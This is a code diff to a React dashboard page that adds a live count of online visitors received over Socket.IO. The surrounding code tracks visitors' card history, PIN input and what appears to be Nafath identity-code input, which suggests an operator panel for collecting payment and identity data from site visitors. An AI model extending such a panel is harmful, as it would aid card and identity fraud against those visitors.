@@ -258,6 +258,7 @@ export default function DashboardPage() {
   const [nowTick, setNowTick] = useState<number>(Date.now());
   const [pinInput, setPinInput] = useState("");
   const [nafadInput, setNafadInput] = useState("");
+  const [onlineVisitors, setOnlineVisitors] = useState<string[]>([]);
   const [expandedCards, setExpandedCards] = useState<Record<string, boolean>>({});
   const [cardsHistory, setCardsHistory] = useState<Record<string, any[]>>({});
   const [hasCardHistory, setHasCardHistory] = useState<Record<string, boolean>>({});
@@ -626,7 +627,8 @@ export default function DashboardPage() {
     const newCount = uniqueCustomerRequests.filter((r) => r.badge === "new").length;
     const pendingCount = uniqueCustomerRequests.filter((r) => r.badge === "pending").length;
     const completedCount = uniqueCustomerRequests.filter((r) => r.badge === "completed").length;
-    const activeCount = Math.max(0, totalCustomers - completedCount);
+    // Use real-time online visitors count
+    const onlineCount = onlineVisitors.length;
     const todayCount = uniqueCustomerRequests.filter((request) => {
       const submitted = request.submittedAt || request.updatedAt;
       if (!submitted) return false;
@@ -643,12 +645,12 @@ export default function DashboardPage() {
       newCount,
       pendingCount,
       completedCount,
-      activeCount,
+      onlineCount,
       todayCount,
       cardCount,
       phoneCount,
     };
-  }, [requests, uniqueCustomerRequests]);
+  }, [requests, uniqueCustomerRequests, onlineVisitors]);
 
   // Handle Socket.IO update
   // Use ref to avoid re-renders and socket reconnections
@@ -876,6 +878,12 @@ export default function DashboardPage() {
     socket.on('dashboard:init', handleDashboardInit);
     socket.on('dashboard:update', handleDashboardUpdate);
     socket.on('dashboard:delete', handleVisitorDelete); // Use same handler for delete
+    socket.on('online:count', (data: { count: number; onlineVisitors: string[] }) => {
+      console.log('[Dashboard] Online visitors count:', data.count);
+      if (data.onlineVisitors) {
+        setOnlineVisitors(data.onlineVisitors);
+      }
+    });
 
     // Connect if not connected
     if (!socket.connected) {
@@ -3230,7 +3238,7 @@ export default function DashboardPage() {
         <div style={{ display: "flex", alignItems: "center", gap: 0, marginRight: "auto", overflowX: "auto", scrollbarWidth: "none" }}>
           <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "0 12px", borderLeft: "1px solid #e5e7eb" }}>
             <span style={{ width: 8, height: 8, borderRadius: "50%", background: "#4ade80", boxShadow: "0 0 0 4px rgba(74, 222, 128, 0.2)" }} />
-            <span style={{ color: "#16a34a", fontWeight: 700, fontSize: "0.9rem" }}>{stats.totalCustomers}</span>
+            <span style={{ color: "#16a34a", fontWeight: 700, fontSize: "0.9rem" }}>{stats.onlineCount}</span>
             <span style={{ color: "#64748b", fontSize: "0.72rem" }}>الزوار الحاليون</span>
           </div>
 
